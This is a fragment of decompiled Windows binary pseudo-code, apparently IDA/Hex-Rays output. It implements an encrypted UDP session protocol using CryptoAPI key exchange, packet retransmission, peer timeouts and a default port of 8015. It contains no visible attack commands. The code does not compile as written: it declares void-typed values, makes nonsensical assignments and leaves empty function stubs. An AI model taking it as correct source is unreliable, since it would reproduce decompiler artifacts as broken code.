		while ( *(char *)(*(v4 + 8) + 6) != HIvoid(a1) )
		{
			v4 = *v4;
			if ( !v4 )
				return 23;
		}
		if ( *(v4 + 8) )
		{
			v5 = HIvoid(a1);
			a1 = 0;
			result = sub_404130(v3, &a1, 4u, 10, v5, 0);
		}
		else
		{
LABEL_17:
			result = 23;
		}
	}
	else
	{
LABEL_16:
		result = 22;
	}
	return result;
}

//----- (00404F70) --------------------------------------------------------
int  sub_404F70(void dwBufLen, void *Memory)
{
	void *v2; 
	int v3; 
	int v5; 
	int v6; 
	unsigned int v7; 
	int v8; 
	int v9; 
	int v10; 
	void *v11; 
	int v12; 
	void v13; 
	int v14; 
	int v15; 

	v2 = dword_40D46C;
	if ( !dword_40D46C )
		goto LABEL_6;
	while ( *(char *)(*(v2 + 2) + 100) != (char)dwBufLen )
	{
		v2 = *(void **)v2;
		if ( !v2 )
			goto LABEL_6;
	}
	v3 = *(v2 + 2);
	if ( !v3 )
	{
LABEL_6:
		j__free(Memory);
		return 22;
	}
	v5 = *(v3 + 52);
	if ( !v5 )
		goto LABEL_13;
	v6 = HIvoid(dwBufLen);
	while ( *(char *)(*(v5 + 8) + 6) != HIvoid(dwBufLen) )
	{
		v5 = *v5;
		if ( !v5 )
			goto LABEL_13;
	}
	if ( !*(v5 + 8) )
	{
LABEL_13:
		j__free(Memory);
		return 23;
	}
	v7 = *(Memory + 64);
	v14 = *(Memory + 64);
	dwBufLen = v7;
	if ( !v7 || CryptEncrypt(*(v3 + 12), 0, 1, 0, 0, &dwBufLen, 0) )
	{
		v9 =  new(0x14u);
		v10 = v9;
		if ( v9 )
		{
			*(v9 + 16) = 0;
			*(v9 + 4) = dwBufLen;
			v11 = malloc(dwBufLen + 9);
			*v10 = v11;
			if ( v11 )
			{
				*(char *)v11 = *(char *)(v3 + 100);
				*(char *)(*v10 + 2) = v6;
				*(char *)(*v10 + 4) = *(char *)(v3 + 96)++;
				*(char *)(*v10 + 6) = 17;
				*(*v10 + 8) = 1;
				if ( !v7
						|| (v12 = v14, memcpy((void *)(*&v10  + 9), Memory, v7), v13 = *(v3 + 12), v15 = v12, CryptEncrypt(v13, 0, 1, 0, (char *)(*v10 + 9), (void *)&v15, dwBufLen)) )
				{
					*(v10 + 4) = dwBufLen + 9;
					*(v10 + 12) = 0;
					*(v10 + 8) = GetTickCount();
					if ( sub_401040(v3 + 60, v10) )
					{
						if ( sendto(&s, *(const char **)v10, *(v10 + 4), 0, (const struct sockaddr *)(v3 + 16), 16) == *(v10 + 4) )
						{
							*(v3 + 108) = GetTickCount();
							v8 = 0;
						}
						else
						{
							WSAGetLastError();
							v8 = 13;
						}
					}
					else
					{
						free(*(void **)v10);
						j__free((void *)v10);
						v8 = 4;
					}
				}
				else
				{
					free(*(void **)v10);
					j__free((void *)v10);
					v8 = 12;
				}
				goto LABEL_29;
			}
			j__free((void *)v10);
		}
		v8 = 8;
	}
	else
	{
		v8 = 12;
	}
LABEL_29:
	j__free(Memory);
	return v8;
}

//----- (004051A0) --------------------------------------------------------
int  sub_4051A0(void this, int a2)
{
	int v2; 
	int result; 
	void *v4; 
	const void *v5; 
	void v6; 
	void v7; 
	int v8; 
	void Size; 

	Size = this;
	v2 = a2;
	v6 = *(a2 + 4);
	v7 = *(a2 + 8);
	Size = 0;
	if ( CryptExportKey(v7, v6, 1u, 0, 0, &Size) )
	{
		v4 = malloc(Size);
		v5 = v4;
		if ( v4 )
		{
			if ( CryptExportKey(*(v2 + 8), *(v2 + 4), 1u, 0, (char *)v4, &Size) )
			{
				v8 = sub_404130(v2, v5, (unsigned int)Size, 2, 0, 0);
				free((void *)v5);
				result = v8;
			}
			else
			{
				free((void *)v5);
				result = 11;
			}
		}
		else
		{
			result = 9;
		}
	}
	else
	{
		result = 11;
	}
	return result;
}

//----- (00405250) --------------------------------------------------------
int  sub_405250(void this, int a2)
{
	int v2; 
	int result; 
	void *v4; 
	const void *v5; 
	void v6; 
	int v7; 
	void Size; 

	Size = this;
	v2 = a2;
	v6 = *a2;
	Size = 0;
	if ( CryptExportKey(v6, 0, 6u, 0, 0, &Size) )
	{
		v4 = malloc(Size);
		v5 = v4;
		if ( v4 )
		{
			if ( CryptExportKey(*v2, 0, 6u, 0, (char *)v4, &Size) )
			{
				v7 = sub_404130(v2, v5, (unsigned int)Size, 1, 0, 0);
				free((void *)v5);
				result = v7;
			}
			else
			{
				free((void *)v5);
				result = 11;
			}
		}
		else
		{
			result = 9;
		}
	}
	else
	{
		result = 11;
	}
	return result;
}

//----- (004052F0) --------------------------------------------------------
int  sub_4052F0(int a1, void wParam)
{
	int v2; 
	int result; 
	int v4; 

	v2 = *(a1 + 52);
	if ( !v2 )
		goto LABEL_10;
	while ( *(char *)(*(v2 + 8) + 6) != *(char *)(wParam + 2) )
	{
		v2 = *v2;
		if ( !v2 )
			return 17;
	}
	v4 = *(v2 + 8);
	if ( v4 )
		result = (-(PostThreadMessageA(*(v4 + 16), 0x403u, wParam, 0) != 0) & 0xFFFFFFEE) + 18;
	else
		LABEL_10:
			result = 17;
	return result;
}

//----- (00405350) --------------------------------------------------------
int  sub_405350(unsigned int a1)
{
	void *v1; 
	int result; 
	int v3; 
	int v4; 
	unsigned int v5; 
	void *v6; 
	int v7; 
	int v8; 

	v1 = dword_40D46C;
	if ( !dword_40D46C )
		goto LABEL_17;
	while ( *(char *)(*(v1 + 2) + 100) != (char)a1 )
	{
		v1 = *(void **)v1;
		if ( !v1 )
			return 22;
	}
	v3 = *(v1 + 2);
	if ( v3 )
	{
		v4 = *(v3 + 52);
		if ( !v4 )
			goto LABEL_18;
		v5 = a1 >> 16;
		while ( *(char *)(*(v4 + 8) + 6) != (char)v5 )
		{
			v4 = *v4;
			if ( !v4 )
				return 23;
		}
		v6 = *(void **)(v4 + 8);
		if ( v6 )
		{
			v7 = v3 + 48;
			v8 = sub_401150(v3 + 48, *(v4 + 8));
			sub_4010A0(v7, (void *)v8);
			sub_403850();
			j__free(v6);
			result = 0;
		}
		else
		{
LABEL_18:
			result = 23;
		}
	}
	else
	{
LABEL_17:
		result = 22;
	}
	return result;
}

//----- (004053E0) --------------------------------------------------------
int  sub_4053E0(void lParam, int a2)
{
	int v2; 
	int v3; 
	int v4; 
	int v5; 
	int v6; 
	int result; 
	int v8; 
	char v9; 
	int v10; 
	int v11; 

	v3 = a2;
	v8 = *(a2 + 16);
	v9 = *v8;
	v4 = *(char *)(v8 + 1);
	v2 = *(lParam + 88);
	(a2) = v9;
	if ( !v2 )
		goto LABEL_6;
	while ( **(char **)(v2 + 8) != v4 )
	{
		v2 = *v2;
		if ( !v2 )
			goto LABEL_6;
	}
	v5 = *(v2 + 8);
	if ( !v5 )
	{
LABEL_6:
		v6 =  new(0x34u);
		v10 = v6;
		v11 = 0;
		if ( v6 )
			v5 = sub_403FB0(v6);
		else
			v5 = 0;
		v11 = -1;
		if ( !v5 )
			return 8;
		if ( !sub_401040(lParam + 84, v5) )
		{
			sub_404000();
			j__free((void *)v5);
			return 4;
		}
		*(char *)v5 = v4;
		*(v5 + 48) = 0;
		*(v5 + 44) = 0;
	}
	sub_401170(v5 + 4, *(v3 + 16) + 3, *(v3 + 12) - 3);
	if ( (char)a2 )
		result = 0;
	else
		result = (-(PostThreadMessageA(dword_40D440, 0x464u, v5, lParam) != 0) & 0xFFFFFFEE) + 18;
	return result;
}

//----- (00405530) --------------------------------------------------------
void  sub_405530()
{
	void result; 
	struct tagMSG Msg; 

	for ( result = PeekMessageA(&Msg, 0, 0, 0, 1u); result; result = PeekMessageA(&Msg, 0, 0, 0, 1u) )
	{
		switch ( Msg.message )
		{
			case 0x405u:
				sub_405350(Msg.wParam);
				break;
			case 0x406u:
				sub_404F70(Msg.wParam, (void *)Msg.lParam);
				break;
			case 0x402u:
				sub_404EE0(Msg.wParam);
				break;
			case 0x401u:
				sub_404E60(Msg.wParam, S(Msg.lParam));
				break;
			case 0x465u:
				sub_404C70(Msg.wParam, S(Msg.lParam));
				break;
			default:
				continue;
		}
	}
	return result;
}

//----- (00405660) --------------------------------------------------------
int  sub_405660(void *Memory)
{
	int v1; 
	int i; 
	int v3; 
	int j; 
	int v5; 
	int k; 
	int v7; 
	int l; 
	void *v9; 
	void *v10; 
	int result; 
	int v12; 

	v1 = (int)Memory;
	if ( *(Memory + 2) )
		CryptDestroyKey(*(Memory + 2));
	if ( *v1 )
		CryptDestroyKey(*v1);
	if ( *(v1 + 12) )
		CryptDestroyKey(*(v1 + 12));
	if ( *(v1 + 4) )
		CryptDestroyKey(*(v1 + 4));
	for ( i = *(v1 + 52); i; i = *(v1 + 52) )
	{
		v3 = *(i + 8);
		TerminateThread(*(void *)(v3 + 20), 0);
		if ( *(v3 + 12) != -1 )
			closesocket(*(&v3  + 12));
		v12 = sub_401150(v1 + 48, v3);
		sub_4010A0(v1 + 48, (void *)v12);
		sub_403850();
		j__free((void *)v3);
	}
	for ( j = *(v1 + 64); j; j = *(v1 + 64) )
	{
		v5 = *(j + 8);
		if ( *v5 )
		{
			if ( *(v5 + 4) )
				free(*(void **)v5);
		}
		j__free(*(void **)(*(v1 + 64) + 8));
		sub_4010A0(v1 + 60, *(void **)(v1 + 64));
	}
	for ( k = *(v1 + 76); k; k = *(v1 + 76) )
	{
		v7 = *(k + 8);
		if ( *(v7 + 16) )
		{
			if ( *(v7 + 12) )
				free(*(void **)(v7 + 16));
		}
		j__free(*(void **)(*(v1 + 76) + 8));
		sub_4010A0(v1 + 72, *(void **)(v1 + 76));
	}
	for ( l = *(v1 + 88); l; l = *(v1 + 88) )
	{
		sub_401230(*(l + 8) + 4);
		sub_401230(*(*(v1 + 88) + 8) + 24);
		v9 = *(void **)(*(v1 + 88) + 8);
		if ( v9 )
		{
			sub_404000();
			j__free(v9);
		}
		sub_4010A0(v1 + 84, *(void **)(v1 + 88));
	}
	sub_402320(*(char *)(v1 + 100));
	v10 = dword_40D46C;
	if ( dword_40D46C )
	{
		while ( *(v10 + 2) != v1 )
		{
			v10 = *(void **)v10;
			if ( !v10 )
				goto LABEL_30;
		}
		sub_404300(v1);
		j__free((void *)v1);
		sub_4010A0((int)&unk_40D468, v10);
		result = 0;
	}
	else
	{
LABEL_30:
		sub_404300(v1);
		j__free((void *)v1);
		result = 0;
	}
	return result;
}

//----- (00405820) --------------------------------------------------------
unsigned int  sub_405820()
{
	unsigned int result; 
	unsigned int v1; 
	void *v2; 

	result = GetTickCount();
	v2 = dword_40D46C;
	v1 = result;
	while ( v2 )
	{
		result = *(v2 + 2);
		v2 = *(void **)v2;
		if ( v1 - *(result + 108) > 60000 * (unsigned int)(unsigned int)word_40D458 )
			result = sub_405660((void *)result);
	}
	return result;
}

//----- (00405870) --------------------------------------------------------
void * sub_405870()
{
	void *result; 
	int v1; 
	int v2; 
	int v3; 
	int v4; 
	char v5; 
	void v6; 
	int v7; 
	const char *v8; 
	void v9; 
	void *v10; 

	v9 = GetTickCount();
	result = dword_40D46C;
	v10 = dword_40D46C;
	if ( !dword_40D46C )
		return result;
	do
	{
		v1 = *(v10 + 2);
		v2 = *(v1 + 64);
		v3 = 0;
		if ( !v2 )
		{
LABEL_8:
			v10 = *(void **)v10;
			goto LABEL_9;
		}
		while ( 1 )
		{
			v4 = *(v2 + 8);
			if ( v9 - *(v4 + 8) > 1000 * (unsigned int)(unsigned int)byte_40D450 )
			{
				if ( !*(v4 + 16) )
					break;
			}
LABEL_7:
			v2 = *v2;
			if ( !v2 )
				goto LABEL_8;
		}
		v5 = *(v4 + 12);
		if ( v5 != byte_40D451 )
		{
			*(v4 + 12) = v5 + 1;
			v6 = GetTickCount();
			v7 = *(v4 + 4);
			v8 = *(const char **)v4;
			*(v4 + 8) = v6;
			sendto(&s, v8, v7, 0, (const struct sockaddr *)(v1 + 16), 16);
			++v3;
			if ( v3 == 4 )
				goto LABEL_8;
			goto LABEL_7;
		}
		v10 = *(void **)v10;
		sub_405660((void *)v1);
LABEL_9:
		result = v10;
	}
	while ( v10 );
	return result;
}

//----- (00405940) --------------------------------------------------------
int  sub_405940(int a1, int a2, int a3)
{
	int v3; 
	int v4; 
	int result; 
	void *v6; 
	int v7; 
	int v8; 
	int v9; 
	int v10; 

	v3 =  new(0x74u);
	v9 = v3;
	v10 = 0;
	if ( v3 )
		v4 = sub_4040C0(v3);
	else
		v4 = 0;
	v10 = -1;
	if ( !v4 )
	{
		*a3 = 8;
		return 0;
	}
	if ( !CryptGetUserKey(hProv, 1u, (void *)v4) )
	{
		v6 = (void *)v4;
		if ( GetLastError() != -2146893811 )
		{
LABEL_12:
			sub_405660(v6);
			*a3 = 10;
			return 0;
		}
		if ( !CryptGenKey(hProv, 1u, 1u, (void *)v4) )
		{
			sub_405660((void *)v4);
			*a3 = 10;
			return 0;
		}
	}
	if ( !CryptGenKey(hProv, 0x6602u, 1u, (void *)(v4 + 8)) )
	{
		v6 = (void *)v4;
		goto LABEL_12;
	}
	*(v4 + 108) = GetTickCount();
	v7 = a2;
	*(v4 + 104) = 0;
	*(char *)(v4 + 98) = 2;
	*(v4 + 16) = *v7;
	*(v4 + 20) = *(v7 + 4);
	*(v4 + 24) = *(v7 + 8);
	v8 = *(v7 + 12);
	*(char *)(v4 + 100) = a1;
	*(v4 + 28) = v8;
	*(char *)(v4 + 96) = 1;
	*(v4 + 112) = 0;
	*(v4 + 4) = 0;
	*(v4 + 12) = 0;
	if ( sub_401040((int)&unk_40D468, v4) )
	{
		result = v4;
	}
	else
	{
		sub_405660((void *)v4);
		*a3 = 4;
		result = 0;
	}
	return result;
}

//----- (00405AE0) --------------------------------------------------------
int  sub_405AE0(signed int a1, int *a2, int a3)
{
	int result; 
	int v4; 
	int *v5; 
	int v6; 
	void v7; 
	void v8; 

	if ( a1 )
	{
		result = 6;
	}
	else
	{
		v5 = a2;
		v4 = sub_405940(*a2, a3, (int)&a1);
		v6 = v4;
		if ( v4 )
		{
			if ( CryptImportKey(hProv, *((const char **)v5 + 4), *(v5 + 3), 0, 1u, (void *)(v4 + 4)) )
			{
				result = sub_405250(v7, v6);
				if ( !result )
					result = sub_4051A0(v8, v6);
			}
			else
			{
				result = 7;
			}
		}
		else
		{
			result = a1;
		}
	}
	return result;
}

//----- (00405B60) --------------------------------------------------------
unsigned int  sub_405B60(void wParam, int a2, int a3)
{
	void *v3; 
	int v4; 
	unsigned int result; 

	v3 = dword_40D46C;
	if ( dword_40D46C )
	{
		while ( *(char *)(*(v3 + 2) + 100) != *(char *)wParam )
		{
			v3 = *(void **)v3;
			if ( !v3 )
				goto LABEL_4;
		}
		v4 = *(v3 + 2);
	}
	else
	{
LABEL_4:
		v4 = 0;
	}
	switch ( *(char *)(wParam + 6) )
	{
		case 1:
			result = sub_405AE0(v4, (int *)wParam, a2);
			*a3 = 1;
			break;
		case 2:
			result = sub_4044A0(v4, wParam);
			*a3 = 1;
			break;
		case 3:
			result = sub_404370(v4, wParam);
			*a3 = 1;
			break;
		case 4:
			result = sub_403DD0(v4, wParam);
			*a3 = 1;
			break;
		case 6:
			result = sub_4044D0(v4, wParam);
			*a3 = 1;
			break;
		case 0xC:
			result = sub_404050(v4, wParam);
			*a3 = 1;
			break;
		case 0x11:
			result = sub_4052F0(v4, wParam);
			*a3 = 0;
			break;
		case 0x14:
			result = sub_404650(v4);
			*a3 = 1;
			break;
		case 0x15:
			result = sub_4047F0(v4, wParam);
			*a3 = 1;
			break;
		case 0x18:
			result = sub_403F40(v4, wParam);
			*a3 = 1;
			break;
		case 0x1E:
			result = sub_4053E0(v4, wParam);
			*a3 = 1;
			break;
		default:
			result = wParam;
			*a3 = 1;
			break;
	}
	return result;
}

//----- (00405CF0) --------------------------------------------------------
void  sub_405CF0()
{
	int v0; 
	unsigned int v1; 
	int v2; 
	unsigned int v3; 
	int v4; 
	int v5; 
	int v6; 
	int v7; 
	int v8; 
	int v9; 
	int v10; 
	int fromlen; 
	struct sockaddr from; 
	int v13; 

	fromlen = 16;
	v0 = recvfrom(s, buf, 65535, 0, &from, &fromlen);
	v1 = v0;
	if ( v0 && v0 != -1 )
	{
		v2 =  new(0x18u);
		v3 = v2;
		if ( v2 )
		{
			*(v2 + 20) = 0;
			if ( sub_403E90((int)buf, v1, v2) )
			{
				sub_403E60((void *)v3);
			}
			else
			{
				v4 = sub_403F10(*(char *)v3);
				v5 = v4;
				if ( v4 && *(v4 + 112) )
				{
					*(v4 + 108) = GetTickCount();
					if ( *(v5 + 36) != *&from.sa_data[2] || *(char *)(v5 + 34) != *(char *)&from.sa_data[0] )
						sendto(&s, buf, v1, 0, (const struct sockaddr *)(v5 + 32), 16);
					else
						sendto(&s, buf, v1, 0, (const struct sockaddr *)(v5 + 16), 16);
				}
				else
				{
					while ( 1 )
					{
						v6 = sub_404580(v3);
						v7 = v6;
						if ( v6 )
							break;
						v8 = sub_405B60(v3, (int)&from, (int)&v13);
						v9 = v8;
						if ( v8 != -1 )
						{
							sub_4043E0(&from, v3, v8);
							if ( v5 )
							{
								if ( v9 != 1 )
									++*(char *)(v5 + 98);
							}
						}
						if ( v13 )
						{
							if ( v3 )
							{
								if ( *(v3 + 12) )
								{
									if ( *(v3 + 16) )
										free(*(void **)(v3 + 16));
								}
								j__free((void *)v3);
							}
						}
						if ( !v5 || (v10 = *(v5 + 76), !v10) )
							return;
						while ( 1 )
						{
							v3 = *(v10 + 8);
							if ( *(char *)(v3 + 4) == *(char *)(v5 + 98) )
								break;
							v10 = *v10;
							if ( !v10 )
								return;
						}
						sub_4010A0(v5 + 72, (void *)v10);
					}
					if ( *(char *)(v3 + 6) != 12 )
						sub_4043E0(&from, v3, v6);
					if ( v7 != 1 )
						sub_403E60((void *)v3);
				}
			}
		}
	}
	else
	{
		GetLastError();
	}
}

//----- (00405EE0) --------------------------------------------------------
int  sub_405EE0(void a1)
{
	int v1; 
	void *i; 
	struct timeval timeout; 
	int readfds; 

	do
	{
		timeout.tv_sec = 0;
		timeout.tv_usec = 10;
		readfds.fd_array[0] = s;
		readfds.fd_count = 1;
		v1 = select(0, &readfds, 0, 0, &timeout);
		if ( v1 )
		{
			if ( v1 == -1 )
			{
				WSAGetLastError();
			}
			else
			{
				if ( v1 == 1 )
					sub_405CF0();
			}
		}
		sub_405530();
		sub_405820();
		sub_405870();
		sub_4049B0();
	}
	while ( !dword_40D45C );
	dword_40D45C = 0;
	if ( buf )
	{
		free(buf);
		buf = 0;
	}
	if ( s != -1 )
	{
		closesocket(&s);
		s = -1;
	}
	for ( i = dword_40D46C; dword_40D46C; i = dword_40D46C )
		sub_405660(*((void **)i + 2));
	WSACleanup();
	return 0;
}

//----- (00405FC0) --------------------------------------------------------
void  sub_405FC0(void a1)
{
	void v1; 
	const void *v2; 
	void v3; 
	void v4; 
	void *v6; 
	void v7; 
	struct WSAData WSAData; 
	void ThreadId; 

	buf = 0;
	hProv = 0;
	Size = 0;
	lpBuffer = 0;
	if ( sub_403CF0(a1) )
	{
		byte_40D452 = 4;
		byte_40D451 = 4;
		byte_40D450 = 5;
		hostshort = 8015;
		word_40D454 = 1000;
		word_40D458 = 60;
	}
	if ( !sub_401580() )
	{
		v6 = malloc(0xFFFFu);
		buf = (char *)v6;
		if ( !v6 )
		{
LABEL_19:
			v2 = lpBuffer;
			goto LABEL_20;
		}
		if ( sub_4014E0(v1, 0, (int)&Size) == 14 )
		{
			v2 = malloc(Size);
			lpBuffer = v2;
			if ( !v2 )
				goto LABEL_17;
			if ( !sub_4014E0(v3, (void)v2, (int)&Size) )
				goto LABEL_10;
			free((void *)lpBuffer);
			lpBuffer = 0;
		}
		Size = 0;
LABEL_10:
		if ( !WSAStartup(2u, &WSAData) )
		{
			if ( CryptAcquireContextA(&hProv, 0, "Microsoft Base Cryptographic Provider v1.0", 1u, 0x20u)
					|| GetLastError() == -2146893802
					&& CryptAcquireContextA(&hProv, 0, "Microsoft Base Cryptographic Provider v1.0", 1u, 0x28u) )
			{
				if ( !sub_403D70() )
				{
					v7 = CreateThread(0, 0, (void ( *)(void))sub_405EE0, 0, 0, &ThreadId);
					v4 = v7;
					if ( v7 )
					{
						sub_4038A0(ThreadId);
						sub_4019D0(ThreadId);
						return v4;
					}
				}
			}
		}
	}
	v2 = lpBuffer;
LABEL_17:
	if ( buf )
	{
		free(buf);
		goto LABEL_19;
	}
LABEL_20:
	if ( v2 )
		free((void *)v2);
	if ( hProv )
		CryptReleaseContext(hProv, 0);
	WSACleanup();
	return 0;
}

//----- (0040785F) --------------------------------------------------------

//----- (004078A9) --------------------------------------------------------
void  sub_4078A9(int a1)
{
	return *(a1 + 12) != 0;
}

//----- (004078B2) --------------------------------------------------------
int  sub_4078B2()
{
	return sub_407FB6();
}

//----- (00407A17) --------------------------------------------------------

//----- (00407BF3) --------------------------------------------------------
int  sub_407BF3()
{
	return 1;
}

//----- (00407BF7) --------------------------------------------------------
int  sub_407BF7()
{
	return sub_407FB6();
}

//----- (00407FE3) --------------------------------------------------------
int  sub_407FE3()
{
	void ms_exc; 

	if ( off_40D078 )
	{
		off_40D078();
		ms_exc.disabled = -1;
	}
	return sub_407FB6();
}

//----- (00408D8E) --------------------------------------------------------
void  sub_408D8E()
{
	unsigned int v0; 
	void ms_exc; 

	v0 = (unsigned int)&unk_40C050;
	while ( v0 < (unsigned int)&unk_40C050 )
	{
		ms_exc.disabled = 0;
		if ( *v0 )
			(*(int (**)(void))v0)();
		v0 += 4;
	}
}

//----- (00408DD2) --------------------------------------------------------
void  sub_408DD2()
{
	unsigned int v0; 
	void ms_exc; 

	v0 = (unsigned int)&unk_40C058;
	while ( v0 < (unsigned int)&unk_40C058 )
	{
		ms_exc.disabled = 0;
		if ( *v0 )
			(*(int (**)(void))v0)();
		v0 += 4;
	}
}

//----- (004099F8) --------------------------------------------------------
int  sub_4099F8()
{
	return 1;
}

//----- (0040AE80) --------------------------------------------------------
int  sub_40AE80(int a1, int a2)
{
	return sub_401380(*(a2 - 16));
}

//----- (0040AEA0) --------------------------------------------------------
void  sub_40AEA0(int a1)
{
	j__free(*(void **)(a1 - 5044));
}

//----- (0040AEC0) --------------------------------------------------------
int  sub_40AEC0()
{
	return filebuf___filebuf();
}

//----- (0040AF00) --------------------------------------------------------
int  sub_40AF00()
{
	return filebuf___filebuf();
}

//----- (0040AF20) --------------------------------------------------------
int  sub_40AF20(int a1, int a2)
{
	return sub_401380(*(a2 - 16) + 48);
}

//----- (0040AF2B) --------------------------------------------------------
int  sub_40AF2B(int a1, int a2)
{
	return sub_401380(*(a2 - 16) + 60);
}

//----- (0040AF36) --------------------------------------------------------
int  sub_40AF36(int a1, int a2)
{
	return sub_401380(*(a2 - 16) + 72);
}


